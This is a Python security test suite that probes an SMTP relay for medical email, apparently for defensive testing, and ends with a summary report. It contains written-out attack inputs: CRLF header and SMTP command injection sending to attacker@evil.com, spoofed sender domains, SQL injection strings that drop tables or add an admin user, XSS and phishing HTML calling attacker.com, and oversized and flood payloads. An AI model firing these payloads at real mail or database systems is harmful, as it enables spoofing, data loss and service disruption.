#!/usr/bin/env python3
"""
Security-focused test suite for SMTP Relay System
Designed to identify vulnerabilities in medical email systems
"""

import smtplib
import time
import threading
import uuid
import subprocess
import sys
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

class SecurityTestSuite:
    def __init__(self, smtp_host="localhost", smtp_port=2525):
        self.smtp_host = smtp_host
        self.smtp_port = smtp_port
        self.test_results = []
        self.lock = threading.Lock()
    
    def log_result(self, test_name, severity, status, details):
        """Log test results with thread safety"""
        with self.lock:
            result = {
                'test': test_name,
                'severity': severity,
                'status': status,
                'details': details,
                'timestamp': datetime.now().isoformat()
            }
            self.test_results.append(result)
            print(f"[{severity}] {test_name}: {status} - {details}")
    
    def send_test_email(self, from_email, to_email, subject, content="", custom_headers=None):
        """Send a test email and return success/failure status"""
        try:
            msg = MIMEText(content or f"Security test email from {from_email}")
            msg["From"] = from_email
            msg["To"] = to_email  
            msg["Subject"] = subject
            
            # Add custom headers if provided
            if custom_headers:
                for key, value in custom_headers.items():
                    msg[key] = value
            
            with smtplib.SMTP(self.smtp_host, self.smtp_port) as server:
                server.send_message(msg)
                return True, "Email sent successfully"
        except Exception as e:
            return False, str(e)
    
    def test_header_injection(self):
        """Test for CRLF injection in email headers"""
        test_name = "Header Injection via Display Name"
        severity = "CRITICAL"
        
        # Attempt CRLF injection through sender display name
        malicious_from = f'Dr. Smith\r\nBcc: attacker@evil.com\r\nX-Admin: true <test@hospital.org>'
        
        success, details = self.send_test_email(
            malicious_from,
            "victim@example.com",
            "Header Injection Test"
        )
        
        if success:
            self.log_result(test_name, severity, "VULNERABLE", 
                           "CRLF injection succeeded - system may be vulnerable to header manipulation")
        else:
            if "invalid" in details.lower() or "malformed" in details.lower():
                self.log_result(test_name, severity, "PROTECTED", 
                               "System properly rejected malformed headers")
            else:
                self.log_result(test_name, severity, "UNKNOWN", f"Unexpected error: {details}")
    
    def test_smtp_command_injection(self):
        """Test for SMTP command injection"""
        test_name = "SMTP Command Injection"
        severity = "CRITICAL"
        
        # Attempt SMTP command injection
        malicious_from = f'test@example.com\r\nQUIT\r\nMAIL FROM:<attacker@evil.com>'
        
        success, details = self.send_test_email(
            malicious_from,
            "victim@example.com", 
            "SMTP Injection Test"
        )
        
        if success:
            self.log_result(test_name, severity, "VULNERABLE",
                           "SMTP command injection may be possible")
        else:
            self.log_result(test_name, severity, "PROTECTED",
                           f"System rejected injection attempt: {details}")
    
    def test_rate_limiting_race_condition(self):
        """Test for race conditions in rate limiting"""
        test_name = "Rate Limiting Race Condition"
        severity = "HIGH"
        
        sender_email = f"racetest@hospital.org"
        num_threads = 20
        emails_per_thread = 10
        
        successful_sends = 0
        failed_sends = 0
        
        def send_concurrent_email(thread_id, email_id):
            success, _ = self.send_test_email(
                sender_email,
                f"race-victim-{thread_id}-{email_id}@example.com",
                f"Race Test {thread_id}-{email_id}"
            )
            return success
        
        # Use ThreadPoolExecutor for true concurrency
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = []
            for thread_id in range(num_threads):
                for email_id in range(emails_per_thread):
                    future = executor.submit(send_concurrent_email, thread_id, email_id)
                    futures.append(future)
            
            # Collect results
            for future in as_completed(futures):
                if future.result():
                    successful_sends += 1
                else:
                    failed_sends += 1
        
        total_attempts = num_threads * emails_per_thread
        success_rate = (successful_sends / total_attempts) * 100
        
        if success_rate > 50:  # If more than 50% succeed, rate limiting may be ineffective
            self.log_result(test_name, severity, "VULNERABLE", 
                           f"High success rate ({success_rate:.1f}%) suggests rate limiting bypass")
        else:
            self.log_result(test_name, severity, "PROTECTED",
                           f"Rate limiting appears effective ({success_rate:.1f}% success)")
    
    def test_domain_spoofing(self):
        """Test domain validation and spoofing"""
        test_name = "Domain Spoofing Attack"
        severity = "HIGH"
        
        # Test various spoofing techniques
        spoofing_attempts = [
            "fake@mail.joinmednet.org.evil.com",  # Subdomain spoofing
            "admin@joinmednet.org.attacker.com",  # Domain suffix spoofing  
            "noreply@joinmednet.org@evil.com",    # @ symbol spoofing
            "test@joinmednet\r\n.org",           # CRLF in domain
        ]
        
        vulnerable_count = 0
        
        for spoofed_domain in spoofing_attempts:
            success, details = self.send_test_email(
                spoofed_domain,
                "victim@example.com",
                "Domain Spoofing Test"
            )
            
            if success:
                vulnerable_count += 1
                self.log_result(f"{test_name} - {spoofed_domain}", "HIGH", "VULNERABLE",
                               "Spoofed domain accepted")
        
        if vulnerable_count > 0:
            self.log_result(test_name, severity, "VULNERABLE",
                           f"{vulnerable_count}/{len(spoofing_attempts)} spoofing attempts succeeded")
        else:
            self.log_result(test_name, severity, "PROTECTED",
                           "All domain spoofing attempts were rejected")
    
    def test_memory_exhaustion(self):
        """Test memory exhaustion through large payloads"""
        test_name = "Memory Exhaustion Attack"  
        severity = "HIGH"
        
        # Create progressively larger payloads
        payload_sizes = [1024, 10*1024, 100*1024, 1024*1024, 10*1024*1024]  # 1KB to 10MB
        
        for size in payload_sizes:
            large_content = "A" * size
            success, details = self.send_test_email(
                "memtest@hospital.org",
                "victim@example.com",
                f"Memory Test - {size} bytes",
                large_content
            )
            
            if success:
                self.log_result(f"{test_name} - {size} bytes", severity, "ACCEPTED",
                               f"Large payload ({size} bytes) was accepted")
            else:
                if "too large" in details.lower() or "limit" in details.lower():
                    self.log_result(f"{test_name} - {size} bytes", severity, "PROTECTED",
                                   f"Payload rejected due to size limits: {details}")
                    break
                else:
                    self.log_result(f"{test_name} - {size} bytes", severity, "ERROR",
                                   f"Unexpected error: {details}")
    
    def test_sql_injection_campaign_id(self):
        """Test SQL injection through campaign tracking"""
        test_name = "SQL Injection in Campaign ID"
        severity = "CRITICAL"
        
        # SQL injection payloads for campaign ID
        sql_payloads = [
            "'; DROP TABLE load_balancing_selections; --",
            "' UNION SELECT * FROM workspaces --",
            "'; INSERT INTO admin_users VALUES('hacker','password'); --",
            "1' OR '1'='1",
        ]
        
        for payload in sql_payloads:
            # We can't directly test campaign ID through SMTP, but we can test
            # if the system handles suspicious campaign identifiers
            success, details = self.send_test_email(
                "test@hospital.org",
                "victim@example.com",
                "SQL Injection Test",
                f"Campaign ID: {payload}",
                {"X-Campaign-ID": payload}
            )
            
            if success:
                self.log_result(f"{test_name} - Payload", severity, "POTENTIAL_VULN",
                               f"SQL payload in headers was accepted: {payload[:50]}...")
            else:
                self.log_result(f"{test_name} - Payload", severity, "PROTECTED",
                               f"System rejected suspicious payload: {details}")
    
    def test_provider_failover_info_disclosure(self):
        """Test information disclosure during provider failover"""
        test_name = "Provider Failover Information Disclosure" 
        severity = "MEDIUM"
        
        # Test with domains that might trigger failover
        test_domains = [
            "test@nonexistent-workspace.com",
            "admin@invalid-provider.org", 
            "system@config-error.com"
        ]
        
        for domain in test_domains:
            success, details = self.send_test_email(
                domain,
                "info-leak-test@example.com",
                "Provider Failover Test"
            )
            
            # Check if error messages contain sensitive information
            sensitive_keywords = ["password", "key", "token", "credential", "database", "connection"]
            
            if any(keyword in details.lower() for keyword in sensitive_keywords):
                self.log_result(f"{test_name} - {domain}", severity, "VULNERABLE",
                               f"Error message may contain sensitive info: {details[:100]}...")
            else:
                self.log_result(f"{test_name} - {domain}", severity, "SECURE",
                               "Error message appears sanitized")
    
    def test_html_content_sanitization(self):
        """Test HTML content sanitization"""
        test_name = "HTML Content Sanitization"
        severity = "MEDIUM"
        
        malicious_html_payloads = [
            '<script>alert("XSS")</script>',
            '<img src="http://attacker.com/steal.php" onerror="alert(1)">',
            '<meta http-equiv="refresh" content="0;url=http://phishing.com">',
            '<iframe src="javascript:alert(1)"></iframe>',
        ]
        
        for payload in malicious_html_payloads:
            # Create multipart message with HTML content
            msg = MIMEMultipart("alternative")
            msg["From"] = "test@hospital.org"
            msg["To"] = "victim@example.com"
            msg["Subject"] = "HTML Sanitization Test"
            
            html_part = MIMEText(f'<html><body>{payload}</body></html>', 'html')
            msg.attach(html_part)
            
            try:
                with smtplib.SMTP(self.smtp_host, self.smtp_port) as server:
                    server.send_message(msg)
                    self.log_result(f"{test_name} - Payload", severity, "ACCEPTED",
                                   f"Malicious HTML payload accepted: {payload[:50]}...")
            except Exception as e:
                self.log_result(f"{test_name} - Payload", severity, "PROTECTED", 
                               f"HTML payload rejected: {str(e)}")
    
    def run_all_tests(self):
        """Run all security tests"""
        print("="*60)
        print("SMTP RELAY SECURITY TEST SUITE")
        print("="*60)
        print(f"Target: {self.smtp_host}:{self.smtp_port}")
        print(f"Start time: {datetime.now().isoformat()}")
        print("="*60)
        
        tests = [
            self.test_header_injection,
            self.test_smtp_command_injection,
            self.test_domain_spoofing,
            self.test_sql_injection_campaign_id,
            self.test_provider_failover_info_disclosure,
            self.test_html_content_sanitization,
            self.test_memory_exhaustion,
            self.test_rate_limiting_race_condition,
        ]
        
        for test in tests:
            print(f"\nRunning {test.__name__}...")
            try:
                test()
                time.sleep(0.5)  # Brief pause between tests
            except Exception as e:
                self.log_result(test.__name__, "ERROR", "FAILED", f"Test error: {e}")
        
        # Generate summary report
        self.generate_summary_report()
    
    def generate_summary_report(self):
        """Generate summary security report"""
        print("\n" + "="*60)
        print("SECURITY TEST SUMMARY REPORT")
        print("="*60)
        
        critical_issues = [r for r in self.test_results if r['severity'] == 'CRITICAL']
        high_issues = [r for r in self.test_results if r['severity'] == 'HIGH'] 
        medium_issues = [r for r in self.test_results if r['severity'] == 'MEDIUM']
        
        vulnerable_tests = [r for r in self.test_results if 'VULNERABLE' in r['status']]
        protected_tests = [r for r in self.test_results if 'PROTECTED' in r['status']]
        
        print(f"Total Tests Run: {len(self.test_results)}")
        print(f"Critical Issues: {len(critical_issues)}")
        print(f"High Issues: {len(high_issues)}")
        print(f"Medium Issues: {len(medium_issues)}")
        print(f"Vulnerable: {len(vulnerable_tests)}")
        print(f"Protected: {len(protected_tests)}")
        
        if critical_issues:
            print(f"\n🚨 CRITICAL VULNERABILITIES FOUND:")
            for issue in critical_issues:
                if 'VULNERABLE' in issue['status']:
                    print(f"  - {issue['test']}: {issue['details']}")
        
        if high_issues:
            print(f"\n⚠️  HIGH SEVERITY ISSUES:")
            for issue in high_issues:
                if 'VULNERABLE' in issue['status']:
                    print(f"  - {issue['test']}: {issue['details']}")
        
        # Recommendations
        print(f"\n📋 SECURITY RECOMMENDATIONS:")
        if len(critical_issues) > 0:
            print("  1. IMMEDIATE ACTION REQUIRED - Critical vulnerabilities detected")
        if len(high_issues) > 0: 
            print("  2. Implement input sanitization and validation")
        print("  3. Add comprehensive security logging")
        print("  4. Implement rate limiting with atomic operations")
        print("  5. Add payload size limits")
        print("  6. Regular security testing in development")
        
        print("="*60)

def main():
    if len(sys.argv) > 1:
        smtp_host = sys.argv[1]
    else:
        smtp_host = "localhost"
    
    if len(sys.argv) > 2:
        smtp_port = int(sys.argv[2])
    else:
        smtp_port = 2525
    
    suite = SecurityTestSuite(smtp_host, smtp_port)
    suite.run_all_tests()

if __name__ == "__main__":
    main()